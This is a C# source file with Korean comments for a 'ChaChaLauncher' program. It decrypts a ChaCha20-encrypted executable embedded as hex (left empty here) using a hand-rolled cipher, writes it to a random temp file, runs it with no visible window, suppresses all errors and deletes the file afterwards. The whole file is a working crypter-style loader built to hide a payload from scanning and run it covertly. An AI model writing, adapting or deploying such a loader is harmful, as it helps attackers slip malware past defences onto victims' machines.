using System;
using System.IO;
using System.Diagnostics;
using System.Threading;

namespace ChaChaLauncher
{
    class Program
    {
        static void Main()
        {
            // 👇 encrypt_payload.js 에서 생성된 3줄의 변수를 여기에 붙여넣으세요 👇
            string encKeyHex = "ef9a9bbbbc0e1212db868bf6db702658f3e9ec7735e75e4c39c5af293ed20613";
            string encNonceHex = "eb9529cf971611859f9112fa";
            string encPayloadHex = "";
            // 👆 ------------------------------------------------- 👆

            string tempPath = Path.Combine(Path.GetTempPath(), "CF_Loader_" + Guid.NewGuid().ToString("N") + ".exe");

            try
            {
                // 1. Hex 문자열을 바이트 배열로 변환
                byte[] key = HexToBytes(encKeyHex);
                byte[] nonce = HexToBytes(encNonceHex);
                byte[] ciphertext = HexToBytes(encPayloadHex);

                // 2. 순수 C# ChaCha20 복호화 (외부 암호화 API 미사용)
                byte[] exeBytes = ChaCha20.Decrypt(key, nonce, ciphertext);

                // 3. 임시 파일로 저장
                File.WriteAllBytes(tempPath, exeBytes);

                // 4. 실행 (콘솔 창 숨김)
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = tempPath,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = Process.Start(startInfo))
                {
                    process.WaitForExit(); // EXE가 완전히 종료될 때까지 대기
                }
            }
            catch (Exception)
            {
                // 배포용이므로 에러 발생 시 조용히 종료 (필요시 로그 기록)
            }
            finally
            {
                // 5. 임시 파일 삭제 (파일 잠금 해제 대기)
                for (int i = 0; i < 5; i++)
                {
                    try
                    {
                        if (File.Exists(tempPath))
                            File.Delete(tempPath);
                        break;
                    }
                    catch
                    {
                        Thread.Sleep(500); // 0.5초 대기 후 재시도
                    }
                }
            }
        }

        // ---------------------------------------------------------
        // [유틸리티] Hex -> Bytes 변환
        // ---------------------------------------------------------
        static byte[] HexToBytes(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < hex.Length; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }
    }

    // ---------------------------------------------------------
    // [순수 C# ChaCha20 구현체 (RFC 7539 표준)]
    // ---------------------------------------------------------
    public static class ChaCha20
    {
        public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ciphertext)
        {
            if (key.Length != 32) throw new ArgumentException("Key must be 32 bytes");
            if (nonce.Length != 12) throw new ArgumentException("Nonce must be 12 bytes");

            byte[] output = new byte[ciphertext.Length];
            uint[] state = new uint[16];
            uint[] workingState = new uint[16];

            // 상수 "expand 32-byte k"
            state[0] = 0x61707865; state[1] = 0x3320646e; state[2] = 0x79622d32; state[3] = 0x6b206574;

            // 키 설정 (Little-Endian)
            for (int i = 0; i < 8; i++) state[4 + i] = BitConverter.ToUInt32(key, i * 4);

            // 카운터 설정 (1부터 시작)
            state[12] = 1;

            // 논스 설정 (12바이트)
            for (int i = 0; i < 3; i++) state[13 + i] = BitConverter.ToUInt32(nonce, i * 4);

            byte[] keystream = new byte[64];
            for (int i = 0; i < ciphertext.Length; i += 64)
            {
                Array.Copy(state, workingState, 16);

                // 20 라운드 (10번의 Double Round)
                for (int round = 0; round < 10; round++)
                {
                    QuarterRound(ref workingState[0], ref workingState[4], ref workingState[8], ref workingState[12]);
                    QuarterRound(ref workingState[1], ref workingState[5], ref workingState[9], ref workingState[13]);
                    QuarterRound(ref workingState[2], ref workingState[6], ref workingState[10], ref workingState[14]);
                    QuarterRound(ref workingState[3], ref workingState[7], ref workingState[11], ref workingState[15]);
                    QuarterRound(ref workingState[0], ref workingState[5], ref workingState[10], ref workingState[15]);
                    QuarterRound(ref workingState[1], ref workingState[6], ref workingState[11], ref workingState[12]);
                    QuarterRound(ref workingState[2], ref workingState[7], ref workingState[8], ref workingState[13]);
                    QuarterRound(ref workingState[3], ref workingState[4], ref workingState[9], ref workingState[14]);
                }

                // 초기 상태와 덧셈
                for (int j = 0; j < 16; j++) workingState[j] += state[j];

                // 바이트 배열로 변환
                for (int j = 0; j < 16; j++) BitConverter.GetBytes(workingState[j]).CopyTo(keystream, j * 4);

                // 복호화 (XOR)
                int blockSize = Math.Min(64, ciphertext.Length - i);
                for (int j = 0; j < blockSize; j++) output[i + j] = (byte)(ciphertext[i + j] ^ keystream[j]);

                // 카운터 증가
                state[12]++;
                if (state[12] == 0) state[13]++;
            }
            return output;
        }

        private static void QuarterRound(ref uint a, ref uint b, ref uint c, ref uint d)
        {
            a += b; d ^= a; d = RotateLeft(d, 16);
            c += d; b ^= c; b = RotateLeft(b, 12);
            a += b; d ^= a; d = RotateLeft(d, 8);
            c += d; b ^= c; b = RotateLeft(b, 7);
        }

        private static uint RotateLeft(uint v, int c) => (v << c) | (v >> (32 - c));
    }
}